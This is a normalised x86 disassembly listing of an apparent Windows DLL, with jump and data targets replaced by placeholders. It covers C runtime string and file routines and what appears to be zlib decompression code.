mov ebx [ esp + 0x8 ]
cmp ebx [ rw-data ]
push esi
push edi
jae r-xdata
call sub_1000644b
mov [ eax ] 0x9
or eax 0xffffffff
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
test [ eax + esi + 0x4 ] 0x1
je r-xdata
push ebx
call sub_10008f0e
mov eax [ edi ]
pop ecx
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_1000644b
mov [ eax ] 0x9
or esi 0xffffffff
push ebx
call sub_10008ecc
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor esi esi
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push ebx
call sub_10008f6d
pop ecx
mov eax esi
jmp r-xdata
call sub_10006454
mov [ eax ] esi
test esi esi
je r-xdata
sub_10009600
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_10009690
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_100096d0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
inc edx
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_1000970a
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_1000644b
mov [ eax ] 0x9
call sub_10006454
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_10008f0e
push esi
call sub_10009767
push esi
mov edi eax
call sub_10008f6d
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_10009767
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_10008ecc
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
je r-xdata
xor eax eax
push edi
call sub_100063d8
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2
call sub_10008ecc
push 0x1
mov edi eax
call sub_10008ecc
pop ecx
cmp eax edi
pop ecx
je r-xdata
cmp esi 0x2
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_10008ecc
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_10008e4d
mov eax esi
and esi 0x1f
sar eax 0x5
pop ecx
mov eax [ eax * 4 + rw-data ]
lea ecx [ esi + esi * 8 ]
and [ eax + ecx * 4 + 0x4 ] 0x0
test edi edi
je r-xdata
sub_100097ea
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_1000440b
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_10009820
push ebp
mov ebp esp
push edi
push esi
push ebx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov al 0xff
mov edi edi
[ rw-data ]
push 0x13
call sub_10005bc2
mov [ esp ] 0x1
push 0x0
jmp r-xdata
movsx eax al
jmp r-xdata
mov al [ esi ]
inc esi
mov ah [ edi ]
inc edi
cmp ah al
je r-xdata
mov ebx eax
pop eax
or eax eax
jne r-xdata
mov al [ esi ]
inc esi
mov bl [ edi ]
inc edi
cmp al bl
je r-xdata
mov eax 0xff
xor ebx ebx
nop
pop ebx
pop esi
pop edi
leave
retn
or al al
je r-xdata
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
xchg al ah
sub al 0x41
cmp al 0x1a
sbb cl cl
and cl 0x20
add al cl
add al 0x41
cmp al ah
je r-xdata
push 0x13
call sub_10005c23
add esp 0x4
[ rw-data ]
jmp r-xdata
or al al
je r-xdata
push eax
push ebx
call sub_100099f1
mov ebx eax
add esp 0x4
call sub_100099f1
add esp 0x4
cmp bl al
je r-xdata
sbb al al
sbb al 0xff
mov eax ebx
sbb eax eax
sbb eax 0xffffffff
sub_100098f0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
[ rw-data ]
cmp [ rw-data ] 0x0
jg r-xdata
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
[ rw-data ]
mov ebx ecx
push 0x13
call sub_10005bc2
mov [ esp ] 0x1
mov ecx ebx
push 0x0
jmp r-xdata
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
xor ecx ecx
cmp eax ebx
je r-xdata
or ebx ebx
je r-xdata
xor eax eax
xor ebx ebx
mov edi edi
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
cmp ah bh
jb r-xdata
pop eax
or eax eax
jne r-xdata
mov ecx 0xffffffff
jb r-xdata
inc esi
inc edi
push ecx
push eax
push ebx
call sub_100099f1
mov ebx eax
add esp 0x4
call sub_100099f1
add esp 0x4
pop ecx
cmp eax ebx
jne r-xdata
neg ecx
jmp r-xdata
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
mov ebx ecx
push 0x13
call sub_10005c23
add esp 0x4
mov ecx ebx
[ rw-data ]
jmp r-xdata
neg ecx
dec ecx
jne r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
mov al [ esi ]
or eax eax
mov bl [ edi ]
je r-xdata
dec ecx
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_100099f1
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_10008dd8
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_10009150
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_10009ac0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_10009b00
sub esp 0x38
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x44 ]
mov edx [ esp + 0x3c ]
push esi
push edi
mov edi [ esp + 0x48 ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x8 ] eax
mov eax [ edi ]
push 0x38
lea ecx [ esp + 0xc ]
push rw-data
push ecx
mov [ esp + 0x20 ] edx
mov [ esp + 0x24 ] eax
mov [ esp + 0x34 ] 0x0
mov [ esp + 0x38 ] 0x0
call sub_10009d50
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x38
retn
lea edx [ esp + 0x8 ]
push 0x4
push edx
call sub_10009d70
mov esi eax
add esp 0x8
cmp esi 0x1
je r-xdata
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x8 ]
push edx
mov [ edi ] ecx
call sub_10009bf0
add esp 0x4
lea eax [ esp + 0x8 ]
push eax
call sub_10009bf0
add esp 0x4
mov eax 0xfffffffb
test esi esi
je r-xdata
mov eax esi
pop edi
pop esi
add esp 0x38
retn
sub_10009ba0
mov eax [ esp + 0x4 ]
xor edx edx
cmp eax edx
je r-xdata
mov eax 0xfffffffe
retn
mov ecx [ eax + 0x1c ]
cmp ecx edx
je r-xdata
push esi
mov [ eax + 0x14 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x18 ] edx
mov esi [ ecx + 0xc ]
push edx
neg esi
sbb esi esi
push eax
and esi 0x7
mov [ ecx ] esi
mov eax [ eax + 0x1c ]
mov ecx [ eax + 0x14 ]
push ecx
call sub_1000a1a0
add esp 0xc
xor eax eax
pop esi
retn
sub_10009bf0
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
mov eax 0xfffffffe
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
mov ecx [ esi + 0x28 ]
push eax
push ecx
call [ esi + 0x24 ]
add esp 0x8
mov [ esi + 0x1c ] 0x0
xor eax eax
pop esi
retn
push esi
push eax
call sub_1000afd0
add esp 0x8
sub_10009c40
mov eax [ esp + 0xc ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
pop edi
mov eax 0xfffffffa
pop esi
retn
mov al [ eax ]
mov cl [ rw-data ]
cmp al cl
jne r-xdata
cmp [ esp + 0x18 ] 0x38
jne r-xdata
mov esi [ esp + 0xc ]
cmp esi edi
jne r-xdata
mov eax [ esi + 0x20 ]
mov [ esi + 0x18 ] edi
cmp eax edi
jne r-xdata
pop edi
mov eax 0xfffffffe
pop esi
retn
cmp [ esi + 0x24 ] edi
jne r-xdata
mov [ esi + 0x20 ] sub_1000b140
mov [ esi + 0x28 ] edi
mov ecx [ esi + 0x28 ]
push 0x18
push 0x1
push ecx
call [ esi + 0x20 ]
add esp 0xc
cmp eax edi
mov [ esi + 0x1c ] eax
jne r-xdata
mov [ esi + 0x24 ] sub_1000b160
mov ecx [ esp + 0x10 ]
mov [ eax + 0x14 ] edi
mov edx [ esi + 0x1c ]
cmp ecx edi
mov [ edx + 0xc ] edi
jge r-xdata
pop edi
mov eax 0xfffffffc
pop esi
retn
cmp ecx 0x8
jl r-xdata
mov eax [ esi + 0x1c ]
neg ecx
mov [ eax + 0xc ] 0x1
push esi
call sub_10009bf0
add esp 0x4
mov eax 0xfffffffe
pop edi
pop esi
retn
cmp ecx 0xf
jg r-xdata
mov edx [ esi + 0x1c ]
mov eax 0x1
shl eax cl
mov [ edx + 0x10 ] ecx
mov ecx [ esi + 0x1c ]
mov edx [ ecx + 0xc ]
neg edx
sbb edx edx
push eax
not edx
and edx sub_1000b010
push edx
push esi
call sub_1000a220
mov ecx [ esi + 0x1c ]
add esp 0xc
mov [ ecx + 0x14 ] eax
mov edx [ esi + 0x1c ]
push esi
cmp [ edx + 0x14 ] edi
jne r-xdata
call sub_10009ba0
add esp 0x4
xor eax eax
pop edi
pop esi
retn
call sub_10009bf0
add esp 0x4
mov eax 0xfffffffc
pop edi
pop esi
retn
sub_10009d70
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
test esi esi
push edi
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffe
pop ebx
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
mov edx [ esp + 0x18 ]
xor ebx ebx
cmp edx 0x4
mov edi 0xfffffffb
setne bl
dec ebx
mov ebp 0x5
and ebx 0xfffffffb
mov [ esp + 0x18 ] ebx
jmp [ ecx * 4 + jump_table_1000a168 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ eax + 0x14 ]
push edi
push esi
push ecx
call sub_1000a2c0
mov edi eax
add esp 0xc
cmp edi 0xfffffffd
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov edx [ esi + 0x1c ]
mov [ edx ] 0xd
mov eax [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ eax + 0x4 ] 0x0
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
pop edi
pop esi
pop ebp
mov eax 0xfffffffd
pop ebx
retn
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
dec ecx
xor edx edx
mov [ esi + 0x4 ] ecx
mov ecx [ esi + 0x8 ]
inc ecx
mov edi ebx
mov [ esi + 0x8 ] ecx
mov ecx [ esi ]
mov dl [ ecx ]
mov [ eax + 0x4 ] edx
mov eax [ esi + 0x1c ]
mov edx [ esi ]
mov ecx [ eax + 0x4 ]
and ecx 0xf
inc edx
cmp cl 0x8
mov [ esi ] edx
je r-xdata
dec eax
xor ecx ecx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
mov edi ebx
mov ebx [ esi + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ esi ]
xor edx edx
mov ebp 0x1f
mov cl [ eax ]
inc eax
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
shl eax 0x8
add eax ecx
div ebp
test edx edx
je r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x1c ]
mov [ edx ] 0xd
mov eax [ esi + 0x1c ]
mov [ eax + 0x4 ] 0x0
jmp r-xdata
dec eax
mov edx [ esi + 0x1c ]
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
xor ecx ecx
mov [ esi + 0x8 ] eax
mov eax [ esi ]
mov edi ebx
mov cl [ eax ]
shl ecx 0x18
mov [ edx + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] 0x9
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
xor edx edx
mov dl [ ecx ]
mov edi ebx
mov ecx [ eax + 0x8 ]
shl edx 0x10
add ecx edx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] 0xa
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
xor edx edx
mov dl [ ecx ]
mov edi ebx
mov ecx [ eax + 0x8 ]
shl edx 0x8
add ecx edx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] 0xb
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
mov [ esi + 0x8 ] edx
xor edx edx
mov dl [ ecx ]
mov ecx [ eax + 0x8 ]
add ecx edx
mov edi ebx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov ecx [ eax + 0x4 ]
mov edx [ eax + 0x8 ]
cmp ecx edx
je r-xdata
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x8 ] edx
xor edx edx
mov [ esi + 0x4 ] eax
mov dl [ ecx ]
mov eax [ esi + 0x1c ]
mov edi ebx
shl edx 0x18
mov [ eax + 0x8 ] edx
mov eax [ esi ]
mov ecx [ esi + 0x1c ]
inc eax
mov [ esi ] eax
mov [ ecx ] 0x3
mov edx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
xor ecx ecx
mov [ esi + 0x8 ] eax
mov eax [ esi + 0x1c ]
mov cl [ edx ]
mov edi ebx
mov edx [ eax + 0x8 ]
shl ecx 0x10
add edx ecx
mov [ eax + 0x8 ] edx
mov eax [ esi ]
mov edx [ esi + 0x1c ]
inc eax
mov [ esi ] eax
mov [ edx ] 0x4
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ esi ]
dec eax
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x8 ]
inc eax
xor edx edx
mov [ esi + 0x8 ] eax
mov eax [ esi + 0x1c ]
mov dl [ ecx ]
mov edi ebx
mov ecx [ eax + 0x8 ]
shl edx 0x8
add ecx edx
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov [ eax ] ebp
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
dec eax
inc edx
mov [ esi + 0x4 ] eax
mov eax [ esi + 0x1c ]
mov [ esi + 0x8 ] edx
xor edx edx
mov dl [ ecx ]
mov ecx [ eax + 0x8 ]
add ecx edx
pop edi
mov [ eax + 0x8 ] ecx
mov eax [ esi ]
inc eax
mov [ esi ] eax
mov eax [ esi + 0x1c ]
mov ecx [ eax + 0x8 ]
mov [ esi + 0x30 ] ecx
pop esi
mov [ eax ] 0x6
pop ebp
mov eax 0x2
pop ebx
retn
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ eax + 0x4 ]
mov edx [ eax + 0x10 ]
shr ecx 0x4
add ecx 0x8
cmp ecx edx
jbe r-xdata
mov [ eax ] 0xd
mov edx [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ edx + 0x4 ] ebp
jmp r-xdata
test cl 0x20
jne r-xdata
mov [ ebx ] 0xd
mov eax [ esi + 0x1c ]
mov ebx [ esp + 0x18 ]
mov ebp 0x5
mov [ esi + 0x18 ] rw-data
mov [ eax + 0x4 ] ebp
jmp r-xdata
cmp edi 0x1
jne r-xdata
mov edi ebx
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
cmp ecx 0xd
ja r-xdata
mov ecx [ esi + 0x1c ]
mov [ ecx ] 0xc
mov [ eax ] 0xd
mov edx [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ edx + 0x4 ] ebp
jmp r-xdata
mov [ eax ] 0x1
mov [ eax ] 0xd
mov edx [ esi + 0x1c ]
mov [ esi + 0x18 ] rw-data
mov [ edx + 0x4 ] ebp
jmp r-xdata
mov eax [ esi + 0x1c ]
mov ebx [ esp + 0x18 ]
mov ebp 0x5
mov [ eax ] 0x2
mov [ ebx ] 0x7
mov ebx [ esp + 0x18 ]
mov ebp 0x5
jmp r-xdata
mov eax [ esi + 0x1c ]
mov edi ebx
mov edx [ eax + 0x14 ]
lea ecx [ eax + 0x4 ]
push ecx
push esi
push edx
call sub_1000a1a0
mov eax [ esi + 0x1c ]
add esp 0xc
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov [ eax ] 0x8
mov [ eax ] 0xc
jmp r-xdata
sub_1000a1a0
mov eax [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push edi
test eax eax
je r-xdata
mov eax [ esi ]
mov edi [ esp + 0x10 ]
cmp eax 0x4
je r-xdata
mov ecx [ esi + 0x3c ]
mov [ eax ] ecx
mov edx [ esi + 0xc ]
mov eax [ edi + 0x28 ]
push edx
push eax
call [ edi + 0x24 ]
add esp 0x8
cmp eax 0x5
jne r-xdata
mov eax [ esi + 0x28 ]
mov [ esi ] 0x0
mov [ esi + 0x34 ] eax
mov [ esi + 0x30 ] eax
mov eax [ esi + 0x38 ]
mov [ esi + 0x1c ] 0x0
test eax eax
mov [ esi + 0x20 ] 0x0
je r-xdata
mov ecx [ esi + 0x4 ]
push edi
push ecx
call sub_1000b960
add esp 0x8
cmp [ esi ] 0x6
jne r-xdata
pop edi
pop esi
retn
push 0x0
push 0x0
push 0x0
call eax
mov [ esi + 0x3c ] eax
add esp 0xc
mov [ edi + 0x30 ] eax
sub_1000a220
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
push 0x40
push 0x1
mov eax [ edi + 0x28 ]
push eax
call [ edi + 0x20 ]
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ecx [ edi + 0x28 ]
push 0x5a0
push 0x8
push ecx
call [ edi + 0x20 ]
add esp 0xc
mov [ esi + 0x24 ] eax
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0x18 ]
mov eax [ edi + 0x28 ]
push ebx
push 0x1
push eax
call [ edi + 0x20 ]
add esp 0xc
mov [ esi + 0x28 ] eax
test eax eax
jne r-xdata
mov edx [ edi + 0x28 ]
push esi
push edx
call [ edi + 0x24 ]
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebx
retn
mov ecx [ esp + 0x14 ]
push 0x0
add eax ebx
push edi
push esi
mov [ esi + 0x2c ] eax
mov [ esi + 0x38 ] ecx
mov [ esi ] 0x0
call sub_1000a1a0
add esp 0xc
mov eax esi
pop edi
pop esi
pop ebx
retn
mov ecx [ esi + 0x24 ]
mov edx [ edi + 0x28 ]
push ecx
push edx
call [ edi + 0x24 ]
mov eax [ edi + 0x28 ]
push esi
push eax
call [ edi + 0x24 ]
add esp 0x10
xor eax eax
pop edi
pop esi
pop ebx
retn
sub_1000a2c0
sub esp 0x30
mov eax [ esp + 0x38 ]
push ebx
mov ebx [ esp + 0x38 ]
push ebp
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0x20 ]
mov ebp [ ebx + 0x1c ]
mov [ esp + 0x8 ] ecx
mov ecx [ ebx + 0x34 ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x30 ]
push esi
cmp ecx eax
push edi
mov [ esp + 0x14 ] edx
mov [ esp + 0x44 ] ecx
jae r-xdata
mov eax [ ebx + 0x2c ]
sub eax ecx
sub eax ecx
dec eax
jmp r-xdata
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x48 ]
mov ecx [ esp + 0x14 ]
mov [ ebx + 0x20 ] edx
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esp + 0x10 ]
push 0xfffffffe
mov edx ecx
mov [ eax ] ecx
mov ecx [ esp + 0x48 ]
sub edx esi
add ebp edx
push eax
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
jmp [ eax * 4 + jump_table_1000af90 ]
mov [ esp + 0x1c ] eax
mov esi [ esp + 0x18 ]
cmp ebp 0x3
jae r-xdata
mov esi [ esp + 0x18 ]
mov edi [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
cmp ebp 0x20
jae r-xdata
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
mov edi [ esp + 0x18 ]
cmp ebp 0xe
jae r-xdata
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x18 ]
mov esi [ esp + 0x48 ]
mov ecx [ esp + 0x44 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x10 ]
mov ecx [ esp + 0x44 ]
mov esi [ esp + 0x48 ]
mov edi [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x48 ]
mov edx [ esp + 0x14 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx ecx
sub edx esi
mov [ eax ] ecx
mov ecx [ esp + 0x44 ]
add ebp edx
push 0xfffffffd
push eax
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov edi [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov edi [ esp + 0x10 ]
mov edx esi
mov ecx esi
not edx
and ecx 0xffff
shr edx 0x10
xor edx ecx
jne r-xdata
xor edx edx
cmp edi edx
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x48 ]
mov [ ebx + 0x20 ] ecx
mov ecx [ esp + 0x10 ]
mov [ ebx + 0x1c ] ebp
mov esi [ eax ]
mov ebp [ eax + 0x8 ]
mov edx ecx
sub edx esi
mov [ eax ] ecx
mov ecx [ esp + 0x44 ]
add ebp edx
mov edx [ esp + 0x4c ]
mov [ eax + 0x4 ] 0x0
push edx
push eax
mov [ eax + 0x8 ] ebp
push ebx
mov [ ebx + 0x34 ] ecx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov ecx [ esp + 0x1c ]
test ecx ecx
jne r-xdata
mov eax edi
and eax 0x3fff
mov ecx eax
mov [ ebx + 0x4 ] eax
and ecx 0x1f
cmp ecx 0x1d
ja r-xdata
mov esi [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ ebx + 0x8 ]
mov eax 0x13
cmp ecx eax
jae r-xdata
cmp ebp 0x3
jae r-xdata
mov ecx [ ebx + 0x24 ]
mov eax [ ebx + 0x4 ]
push esi
push ecx
lea edx [ esp + 0x40 ]
lea ecx [ esp + 0x44 ]
push edx
push ecx
lea edx [ esp + 0x2c ]
lea ecx [ esp + 0x30 ]
push edx
mov edx [ ebx + 0xc ]
push ecx
mov ecx eax
shr ecx 0x5
and ecx 0x1f
and eax 0x1f
inc ecx
push edx
add eax 0x101
push ecx
push eax
mov [ ebx + 0x14 ] 0x0
mov [ esp + 0x44 ] 0x9
mov [ esp + 0x40 ] 0x6
call sub_1000bef0
add esp 0x24
mov [ esp + 0x18 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x10 ]
cmp ebp eax
jae r-xdata
push eax
push esi
push ebx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x30
retn
mov ecx [ ebx + 0x4 ]
push esi
push ecx
mov [ esp + 0x54 ] 0x0
call sub_1000b960
mov eax [ ebx + 0x20 ]
mov ecx [ ebx + 0x34 ]
mov edi [ esi ]
mov edx [ esi + 0x4 ]
mov ebp [ ebx + 0x1c ]
mov [ esp + 0x20 ] eax
mov eax [ ebx + 0x30 ]
add esp 0x8
cmp ecx eax
mov [ esp + 0x10 ] edi
mov [ esp + 0x14 ] edx
mov [ esp + 0x44 ] ecx
jae r-xdata
mov [ ebx ] 0x8
jmp r-xdata
mov edx [ esp + 0x18 ]
mov [ ebx + 0x1c ] ebp
mov [ ebx + 0x20 ] edx
mov edx [ esp + 0x14 ]
mov ebp [ esi ]
mov [ esi + 0x4 ] edx
mov edx edi
mov [ esi ] edi
sub edx ebp
